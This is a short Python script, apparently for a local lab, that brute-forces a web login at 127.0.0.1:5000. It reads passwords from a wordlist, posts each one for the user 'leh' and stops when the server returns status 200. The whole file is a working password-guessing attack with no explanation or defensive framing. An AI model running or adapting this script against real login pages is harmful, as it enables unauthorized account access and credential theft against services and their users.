import requests

url = "http://127.0.0.1:5000/login"
wordlist = "./wordlist.txt"
user = "leh"

with open(wordlist, 'r') as file:
    for line in file.readlines():
        line = line.rstrip()
        login = requests.post(url, {"username": user, "password": line})

        if login.status_code == 200:
            print(f'Sucess - password: {line}')
            break